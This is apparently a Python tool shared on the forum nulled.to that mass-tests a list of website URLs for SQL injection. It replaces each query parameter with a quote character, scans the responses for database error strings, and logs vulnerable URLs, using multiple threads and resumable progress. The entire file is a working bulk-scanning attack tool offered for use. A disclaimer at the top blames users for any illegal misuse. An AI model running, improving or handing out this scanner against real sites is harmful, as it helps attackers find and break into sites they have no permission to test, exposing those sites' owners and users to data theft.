"""

    Made by XG4 for free for nulled.to

    If you want to repost this you have to ask for permission first, please

    By using this program you agree that any illegal misuse is your fault
    I am not responsible for any use against servers/websites that you do not have permission to test on



    > Info if you are trying to understand the code <

    I tried to make it as easy as possible without wasting too much time

    If you are just starting out with python i suggest checking in depth how files work
    If you don't understand how files work you will probably not understand how the files are managed here

"""
from threading import Thread
from typing import Union, List, TextIO
from queue import Queue, Empty
import requests
import os
import sys
import time


class QueueLoader(Thread):
    def __init__(self, file: Union[List, TextIO], size: int, start_pos: int = 0, pos_save_file: TextIO = None):
        """
        Creates a queue that automatically refills taking lines from the given file (Also works with lists but i do not
        see the point of using this with them)

        This is useful if you have a very big file (More than than ram size)
        This has only loaded in ram "size" lines

        There is a done attribute which gets set to True when the file/list has been looped through fully

        :param file: A file opened in read mode/a list
        :param size: The maximum size of the queue
        :param start_pos: The line to start from
        :param pos_save_file: If you want to save the number of the first line that will be loaded next set this toa writable file
        """

        # Creates a new queue of max size size
        self.queue = Queue(maxsize=size)

        # Assigns some values
        self.file = file
        self.size = size
        self.pos_save_file = pos_save_file
        self.done = False
        # 1 needs to be subtracted if possible because if not it would skip a line
        self.start_pos = start_pos - 1 if start_pos > 0 else 0
        Thread.__init__(self)

    def run(self):
        # Returns to the start of the file if it is not a list
        if type(self.file) != list:
            self.file.seek(0)

        pos = 0

        # Start pos == starting line
        # If the start pos is a number != 0 loop through the lines until the line of the given position is found
        # If the starting pos is 0 you do not need to loop because you are already at the position
        if self.start_pos:
            for _ in self.file:
                if pos == self.start_pos:
                    break
                pos += 1

        # For every url starting from the position set above
        for url in self.file:
            # Add the line that you read to the queue, if the queue is full wait till some space frees up
            self.queue.put(url, block=True)

            # If a posfile is set write to it the next starting position and flush (save) it to disk
            if self.pos_save_file:
                pos += 1
                self.pos_save_file.truncate(0)
                self.pos_save_file.seek(0)
                self.pos_save_file.write(str(pos - self.size))
                self.pos_save_file.flush()
                os.fsync(self.pos_save_file.fileno())

        # Everything is done so set the done attribute to True
        self.done = True


class Exploiter(Thread):
    # Static attribute, counts how many urls have been processed by all the threads
    # I'm sorry but this is the easiest way i found to do this
    processed_urls: int = 0

    # If you want to add more be sure to add them lowercase since i lowercase the html
    error_messages = [
        "sql",  # Very non specific but better add some false positives than to remove some positives
                # Since this is very generic you do not need to add mysql,mssql,etc since they contain sql in their name
        "mariadb",  # I think db is too specific, if you want you can remove these databases and add "db" only
        "mongodb",
        "syntax error",
        "oracle"
    ]

    @staticmethod
    def test_url(url: str, timeout: int = 10, useragent: str = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0") -> bool:
        # If the url does not have these two characters it does not have get parameters, so it cannot be tested
        if '=' not in url or '?' not in url:
            return False

        # This creates an url list with, for every url, a single parameter got from the url with the value replaced to '
        # This is a little bit inefficient if the url has a single parameter, oh well...
        split_url = url.split('?')
        urls = [split_url[0] + '?' + param.split("=")[0] + "='" for param in split_url[1].split('&')]

        # For every url in the urls generated before
        for url in urls:
            try:
                # Get the html and make it lowercase
                html = requests.get(url, timeout=timeout, headers={"User-Agent": useragent}).text.lower()
            except (requests.exceptions.RequestException, UnicodeError):
                # Return False if there was an error in the unicode or in the request (E.g. url offline/slow)
                return False

            # Loop every error and if one is found in the html return True
            for error in Exploiter.error_messages:
                if error in html:
                    return True

        # If all urls have been used and no error has been found return False
        return False

    def __init__(self, result_file: TextIO, queue: Queue, progress_bar: bool = False, tot_urls: int = 0, start_urls: int = 0):
        """
        Creates an exploiter that takes urls from the given queue and test them for sql errors

        :param result_file: The file to save th exploitable urls to
        :param queue: The queue to take the urls from
        :param progress_bar: Set to true if you want to display a progress "bar" (Just shows how many urls are left)
        :param tot_urls: If the progressbar is enabled you need to give the number of total urls that will be encountered
        :param start_urls: If you started after 0 set this to the url you started from
        """
        # Just sets some values
        self.result_file = result_file
        self.queue = queue
        self.progress_bar = progress_bar
        self.tot_urls = tot_urls
        Exploiter.processed_urls = start_urls if start_urls else Exploiter.processed_urls
        Thread.__init__(self)

    def run(self):
        # While the queue is not empty
        while not self.queue.empty():
            try:
                # Try to get an url from the queue and remove the '\n' from the start and end
                url = self.queue.get(timeout=10).strip('\n')
            except Empty:  # queue.Empty
                # If after 10 seconds the queue is still empty, exit from the loop
                break

            # Test the url and if it is exploitable
            if Exploiter.test_url(url):
                # Save it to file and flush (Save) the file to disk
                self.result_file.write(url + '\n')
                self.result_file.flush()
                os.fsync(self.result_file.fileno())

            self.queue.task_done()
            # Add one to the processed urls since we processed an url (Duh)
            Exploiter.processed_urls += 1

            # If the progress bar is enabled, update the number shown on screen
            if self.progress_bar:
                print('\r' + str(self.tot_urls - Exploiter.processed_urls), end="")
                sys.stdout.flush()


def line_counter(lines: Union[List[str], TextIO]) -> int:
    """
    Counts how many lines are in the given file/list (Works with lists but please do len(list) instead)

    :param lines: A file/list containing stuff
    :return: The number of lines in the given file/line
    """
    # Idiot proof test
    if type(lines) == list:
        return len(lines)

    lines_n = 0
    # Sets tell to the current file position
    tell = lines.tell()
    # Go to the start of the file
    lines.seek(0)
    # For every line in the file add one to lines_n
    for _ in lines:
        lines_n += 1
    # Go back to the previous position
    lines.seek(tell)
    # Return the number of lines
    return lines_n


def yn_input(message: str = "", default: str = 'y') -> bool:
    """
    Simple yes/no input

    :param message: The message to print
    :param default: The default input (Must be 'y' or 'n') (In case of user error)
    :return: True if 'y', False if 'n', if wrong input and the default is 'y' True else if it is 'n' False
    """
    # Idiot test
    if not (default == 'y' or default == 'n'):
        raise ValueError
    # Gets an input and lowers it
    choice = input(message).lower()
    # I'm sorry if this is hard to understand but i have no easy way of explaining it, :(
    return default == 'y' if choice != ('y' if default == 'n' else 'n') else 'y' == choice


def __exploit(urls: Union[List[str], TextIO], result_file: TextIO, threads: int = 1, use_pos_file: bool = False, resume_pos: int = 0):
    """
    Please do not use this function as it is highly specific to this use-case
    It is better for everyone if you rewrite it

    Exploits all the urls in the given urls file/list with "threads" exploiter threads, then saves them to the result_file

    :param urls: A file opened in read mode/list of urls
    :param result_file: A file opened in write mode
    :param threads: The number of threads
    :param use_pos_file: Set to true if you want to use a pos file to write the current queue position
    :param resume_pos: The position to resume from
    """
    # Sets start_time to the current time
    start_time = time.time()

    # raise a value error if the threads are fewer than one
    if threads < 1:
        raise ValueError

    # Sets len_urls to the number of urls
    len_urls = line_counter(urls)

    # Creates a new QueueLoader
    qloader = QueueLoader(urls, threads*2, resume_pos, open("file.pos", "w") if use_pos_file else None)

    # Now, the queue does as it should, but most people probably wont want it to "skip" the unused urls even tho they have technically been added to the queue and so technically been used
    # So i just update the size to include that when the pos gets calculated and saved to file (Don't worry the queue size has already been assigned)
    qloader.size = threads * 3

    # Starts the queue loader
    qloader.start()

    # Waits for the QueueLoader to fill up a little bit
    while qloader.queue.qsize() < threads:
        pass

    # Info
    print("\n\nRemaining lines:")

    # Adds the processed urls from the backup run to the current processed urls
    Exploiter.processed_urls = resume_pos

    # Creates "threads" threads, starts them and adds them to the workers list
    workers = []
    for _ in range(threads):
        thread = Exploiter(result_file, qloader.queue, True, len_urls)
        thread.setDaemon(True)
        thread.start()
        workers.append(thread)

    # Waits for every worker to finish
    for w in workers:
        w.join()

    # Waits for the queueloader to finish (Even though it should 100% already have)
    qloader.join()

    # Prints some info
    print("\n\nTested " + str(len_urls) + " in " + str(int(time.time() - start_time)) + "s")


if __name__ == "__main__":
    def _____iwanttomakeaoneliner():
        try:
            return int(open("file.pos", "r").read().strip('\n'))
        except (ValueError, FileNotFoundError):
            return 0

    try:
        pos_file = yn_input("Do you want to save a \"backup\" in case something goes wrong? [Y/n]: ", 'y')

        __exploit(open(str(input("Path/Filename of the file containing the urls to test\n: ")), "r"),
                  open("ExploitableUrls.txt", "a"),
                  int(input("How many threads do you want to use? ")),
                  pos_file,
                  _____iwanttomakeaoneliner() if os.path.isfile("./file.pos") and yn_input("Do you want to resume your last backup? [Y/n]: ", 'y') and
                  pos_file else 0)

        try:
            os.remove("./file.pos")
        except FileNotFoundError:
            pass
    except ValueError:
        print("The entered threads number is invalid!")
    except FileNotFoundError:
        print("The given file does not exist!")

